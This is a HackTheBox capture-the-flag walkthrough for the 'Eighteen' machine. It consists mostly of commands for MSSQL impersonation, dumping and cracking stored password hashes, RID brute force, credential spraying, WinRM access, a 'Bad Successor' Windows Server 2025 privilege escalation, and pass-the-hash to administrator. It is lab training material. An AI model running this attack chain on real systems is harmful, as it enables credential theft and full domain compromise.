# HackTheBox - Eighteen
**Youtube video:** https://youtu.be/xcDJNDQzVms
---
## Initial Foothold

**Setup:**
```bash
# Add to hosts
vim /etc/hosts
# Add manually: eighteen.htb

# Check web - not vulnerable
```

---
## MSSQL Enumeration

**NetExec Enumeration:**
```bash
# Check impersonation privileges
nxc mssql $IP -u "kevin" -p 'iNa2we6haRj2gaw!' --local-auth -M enum_impersonate

# Check MSSQL privileges
nxc mssql $IP -u "kevin" -p 'iNa2we6haRj2gaw!' --local-auth -M mssql_priv

# Check specific actions
nxc mssql $IP -u "kevin" -p 'iNa2we6haRj2gaw!' --local-auth -M mssql_priv -O=priv_esc
```

---
## MSSQL Manual Enumeration

**Connect and Impersonate:**
```bash
# Connect to MSSQL
mssqlclient.py kevin:'iNa2we6haRj2gaw!'@$IP
```

```sql
# Impersonate appdev user
EXECUTE AS LOGIN = 'appdev'

# List databases
SELECT name FROM sys.databases;

# Access financial planner database
USE financial_planner;

# Extract user credentials
SELECT * FROM users;
```

**Crack Werkzeug Hashes:**
```bash
# Werkzeug format: pbkdf2:sha256:600000$
# Convert to hashcat format
# Tool: https://github.com/Armageddon0x00/werkzeug2hashcat

# Crack with hashcat
hashcat -m 10900 hashes.txt $rockyou
```

---
## RID Brute Force

```bash
# Enumerate users via RID brute force
nxc mssql $IP -u "kevin" -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
```

```
credspray $IP -u usernames.txt -p $pass
```

---
## Lateral Movement & Reconnaissance

**WinRM Access:**
```bash
# Connect via Evil-WinRM
evil-winrm -i $IP -u $user -p $pass

# Check system information
Get-ComputerInfo

# Found: Windows Server 2025 => Bad Successor vulnerability
```

---
## Pivoting with Ligolo-ng

**Setup Ligolo Tunnel:**
```bash
# Upload ligolo and set up a tunnel
```

---
## Bad Successor Exploitation

**Exploit:** Bad Successor - Windows Server 2025 Privilege Escalation

**NetExec Bad Successor Module:**
```bash
# Check with NetExec module
nxc ldap $IP -u $user -p $pass -M badsuccessor
# Check my GitHub for: auth_ldap

# Install custom NetExec fork with bad successor support
uv tool run --from git+https://github.com/azoxlpf/NetExec@feat/refactor-badsuccessor nxc ldap 240.0.0.1 -u $user -p $pass -M badsuccessor -o TARGET_OU='Staff,DC=eighteen,DC=htb'
```

**Time Synchronization Fix:**
```bash
# In case you got an error due to date missync
sudo systemctl restart systemd-timesyncd.service ; sudo timedatectl set-ntp no ; sudo ntpdate -u 240.0.0.1
```

**Administrator Access:**
```bash
# Now we get NTLM hash from Bad Successor exploit

# Pass-the-hash with administrator
evil-winrm -i $IP -u administrator -H hash
```
